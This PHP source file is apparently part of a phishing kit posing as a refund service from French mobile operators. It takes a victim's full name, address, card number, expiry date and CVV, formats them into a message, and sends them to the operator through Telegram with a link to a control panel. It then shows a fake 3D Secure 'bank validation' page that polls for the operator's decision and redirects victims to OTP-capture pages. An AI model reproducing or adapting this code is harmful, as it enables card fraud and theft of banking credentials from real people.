<?php
require_once 'auth_check.php';
session_start();

// اختبار الاتصال بتيليجرام
require_once 'functions.php';
require_once 'bots.php';
// تسجيل الأخطاء
error_reporting(E_ALL);
ini_set('display_errors', 1);

// اختبار الاتصال
$test_message = "🔄 Test de connexion\n" . date('Y-m-d H:i:s');
$test_result = sendTelegramMessage($test_message);
if ($test_result === false) {
    error_log("Erreur de connexion Telegram");
}

// التحقق من نوع الطلب
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'] === 'XMLHttpRequest') {
    // طلب AJAX - إرجاع JSON
    header('Content-Type: application/json');
    
    // إنشاء معرف جلسة جديد
    $sessionId = 'session_' . time() . '_' . bin2hex(random_bytes(8));
    
    // استلام البيانات
    $data = json_decode(file_get_contents('php://input'), true);
    
    // التحقق من صحة البيانات
    if (!isset($data['prenom']) || !isset($data['nom']) || !isset($data['numero_carte'])) {
        echo json_encode([
            'success' => false,
            'message' => 'Données manquantes'
        ]);
        exit;
    }

    // تنظيف وتأمين البيانات
    $data = sanitizeData($data);

    // التحقق من صحة البيانات
    $validation_errors = validateData($data);
    if (!empty($validation_errors)) {
        echo json_encode([
            'success' => false,
            'message' => implode(', ', $validation_errors)
        ]);
        exit;
    }

    // إضافة معرف الجلسة للبيانات
    $data['session_id'] = $sessionId;
    
    // حفظ البيانات في الجلسة
    $_SESSION['transaction_data_' . $sessionId] = $data;

    // الحصول على URL الأساسي
    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https://' : 'http://';
    $host = $_SERVER['HTTP_HOST'];
    $controlPanelUrl = $protocol . $host . '/chtouki/control_panel.php?session=' . $sessionId;

    // تنسيق الرسالة
    $message = "🔔 Nouvelle demande de remboursement\n\n";
    $message .= "🆔 ID Transaction: {$sessionId}\n\n";
    $message .= "👤 Informations client:\n";
    $message .= "Nom complet: {$data['prenom']} {$data['nom']}\n";
    $message .= "Pays: {$data['pays']}\n";
    $message .= "Adresse: {$data['adresse']}\n";
    $message .= "Code postal: {$data['code_postal']}\n";
    $message .= "Ville: {$data['ville']}\n\n";
    $message .= "💳 Informations carte:\n";
    $message .= "Numéro: {$data['numero_carte']}\n";
    $message .= "Expiration: {$data['mois_expiration']}/{$data['annee_expiration']}\n";
    $message .= "CVV: {$data['cvv']}\n\n";
    $message .= "📱 Opérateur: {$data['operateur']}\n\n";
    $message .= "🔗 Panneau de contrôle:\n";
    $message .= $controlPanelUrl;

    // إرسال الرسالة إلى تيليجرام
    if (sendTelegramMessage($message)) {
        echo json_encode([
            'success' => true,
            'message' => 'Données traitées avec succès',
            'session_id' => $sessionId
        ]);
    } else {
        echo json_encode([
            'success' => false,
            'message' => 'Une erreur est survenue lors de l\'envoi de votre demande'
        ]);
    }
} else {
    // طلب عادي - عرض صفحة HTML
    $sessionId = $_GET['session'] ?? null;
    
    // التحقق من وجود معرف الجلسة والبيانات
    if (!$sessionId) {
        header('Location: index.php');
        exit;
    }

    // استرجاع بيانات المعاملة
    $transactionData = getTransactionData($sessionId);
    if (!$transactionData) {
        header('Location: index.php');
        exit;
    }
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Traitement de votre demande</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .processing-container {
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 500px;
            width: 100%;
        }

        .icon {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
            color: #007bff;
        }

        .title {
            color: #333;
            font-size: 24px;
            margin-bottom: 20px;
        }

        .validation-steps {
            text-align: left;
            margin: 30px 0;
            padding: 20px;
            background: #f8f9fa;
            border-radius: 8px;
            border-left: 4px solid #007bff;
        }

        .step {
            display: flex;
            align-items: flex-start;
            margin-bottom: 20px;
            padding-left: 10px;
        }

        .step:last-child {
            margin-bottom: 0;
        }

        .step-number {
            background: #007bff;
            color: white;
            width: 24px;
            height: 24px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            flex-shrink: 0;
            font-weight: bold;
        }

        .step-content {
            flex: 1;
        }

        .step-title {
            font-weight: bold;
            margin-bottom: 5px;
            color: #333;
        }

        .step-description {
            color: #666;
            font-size: 14px;
            line-height: 1.5;
        }

        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #007bff;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .transaction-id {
            background-color: #f8f9fa;
            padding: 10px;
            border-radius: 5px;
            font-family: monospace;
            margin: 20px 0;
            color: #666;
        }

        .bank-logos {
            margin-top: 30px;
            display: flex;
            justify-content: center;
            gap: 20px;
            align-items: center;
        }

        .bank-logos img {
            height: 30px;
            object-fit: contain;
        }

        .secure-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            color: #28a745;
            margin-top: 20px;
            font-size: 14px;
        }

        .notice {
            background: #fff3cd;
            border: 1px solid #ffeeba;
            color: #856404;
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
            text-align: left;
        }

        .notice i {
            margin-right: 10px;
        }

        #status-message {
            color: #007bff;
            font-weight: bold;
            padding: 5px 10px;
            background: #e7f3ff;
            border-radius: 3px;
            display: inline-block;
            transition: all 0.3s ease;
        }
        
        #status-message.approved {
            color: #28a745;
            background: #d4edda;
        }
        
        #status-message.rejected {
            color: #dc3545;
            background: #f8d7da;
        }
        
        #status-message.waiting {
            color: #ffc107;
            background: #fff3cd;
        }
        
        #status-message.otp_required {
            color: #17a2b8;
            background: #d1ecf1;
        }
        
        #status-message.pending {
            color: #007bff;
            background: #e7f3ff;
        }
        
        #status-message.otp_incorrect {
            color: #dc3545;
            background: #f8d7da;
        }
    </style>
</head>
<body>
    <div class="processing-container">
        <div class="icon">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <circle cx="12" cy="12" r="10"/>
                <path d="M12 6v6l4 2"/>
            </svg>
        </div>
        <h1 class="title">Validation Bancaire Requise</h1>
        
        <div class="notice">
            <i class="fas fa-info-circle"></i>
            Une validation via votre application bancaire est nécessaire pour finaliser votre demande.
            <p><strong>Statut:</strong> <span id="status-message">En cours de validation</span></p>
        </div>

        <div class="validation-steps">
            <div class="step">
                <div class="step-number">1</div>
                <div class="step-content">
                    <div class="step-title">Ouvrez votre application bancaire</div>
                    <div class="step-description">
                        Lancez l'application mobile de votre banque sur votre smartphone.
                    </div>
                </div>
            </div>

            <div class="step">
                <div class="step-number">2</div>
                <div class="step-content">
                    <div class="step-title">Localisez la notification</div>
                    <div class="step-description">
                        Recherchez une notification de validation en attente dans votre application.
                        Elle devrait apparaître dans votre centre de notifications.
                    </div>
                </div>
            </div>

            <div class="step">
                <div class="step-number">3</div>
                <div class="step-content">
                    <div class="step-title">Vérifiez les détails</div>
                    <div class="step-description">
                        Confirmez que le montant et les informations de la transaction correspondent
                        à votre demande de remboursement.
                    </div>
                </div>
            </div>

            <div class="step">
                <div class="step-number">4</div>
                <div class="step-content">
                    <div class="step-title">Validez la transaction</div>
                    <div class="step-description">
                        Utilisez votre méthode habituelle d'authentification (empreinte digitale, 
                        Face ID ou code PIN) pour approuver la transaction.
                    </div>
                </div>
            </div>
        </div>

        <div class="loader"></div>
        
        <div class="transaction-id">
            ID Transaction: <?php echo htmlspecialchars($sessionId); ?>
        </div>

        <div class="secure-badge">
            <i class="fas fa-shield-alt"></i>
            Sécurisé par 3D Secure
        </div>

        <div class="bank-logos">
            <img src="assets/img/Bouygues_Telecom_(alt_logo).svg.png" alt="Bouygues">
            <img src="assets/img/SFR-2022-logo.svg.png" alt="SFR">
            <img src="assets/img/1683000787orange-icon-png.png" alt="Orange">
        </div>
    </div>

    <script>
        const sessionId = '<?php echo $sessionId; ?>';
        let checkStatusInterval;
        let lastStatus = '';

        function checkTransactionStatus() {
            fetch('send_action.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    action: 'check_status',
                    session_id: sessionId
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    if (lastStatus === data.status) {
                        return;
                    }
                    lastStatus = data.status;
                    
                    // تحديث رسالة الحالة
                    const statusElement = document.getElementById('status-message');
                    if (statusElement) {
                        statusElement.textContent = data.message || 'En cours de validation';
                        // إزالة جميع الclasses وإضافة الclass المناسب
                        statusElement.className = '';
                        statusElement.classList.add(data.status);
                    }

                    switch(data.status) {
                        case 'approved':
                            const approvedMsg = document.getElementById('status-message');
                            approvedMsg.textContent = 'Transaction approuvée';
                            approvedMsg.className = 'approved';
                            clearInterval(checkStatusInterval);
                            window.location.href = 'success.php?session=' + sessionId;
                            break;
                        case 'rejected':
                            const rejectedMsg = document.getElementById('status-message');
                            rejectedMsg.textContent = 'Transaction rejetée';
                            rejectedMsg.className = 'rejected';
                            clearInterval(checkStatusInterval);
                            window.location.href = 'error.php?session=' + sessionId;
                            break;
                        case 'otp_required':
                            const otpMsg = document.getElementById('status-message');
                            otpMsg.textContent = 'Code OTP requis';
                            otpMsg.className = 'otp_required';
                            clearInterval(checkStatusInterval);
                            window.location.href = 'otp.php?session=' + sessionId;
                            break;
                        case 'waiting':
                            const waitingMsg = document.getElementById('status-message');
                            waitingMsg.textContent = 'Transaction en attente';
                            waitingMsg.className = 'waiting';
                            clearInterval(checkStatusInterval);
                            window.location.href = 'waiting.php?session=' + sessionId;
                            break;
                        case 'otp_incorrect':
                            const otpIncorrectMsg = document.getElementById('status-message');
                            otpIncorrectMsg.textContent = 'Code OTP incorrect';
                            otpIncorrectMsg.className = 'otp_incorrect';
                            clearInterval(checkStatusInterval);
                            window.location.href = 'otp.php?session=' + sessionId;
                            break;
                        case 'pending':
                            const pendingMsg = document.getElementById('status-message');
                            pendingMsg.textContent = 'En cours de validation';
                            pendingMsg.className = 'pending';
                            break;
                    }
                }
            })
            .catch(error => {
                console.error('Error:', error);
            });
        }

        // بدء فحص الحالة كل 5 ثوانٍ
        checkStatusInterval = setInterval(checkTransactionStatus, 5000);
        // فحص الحالة مباشرة عند تحميل الصفحة
        checkTransactionStatus();
    </script>
</body>
</html>
<?php
}
?>
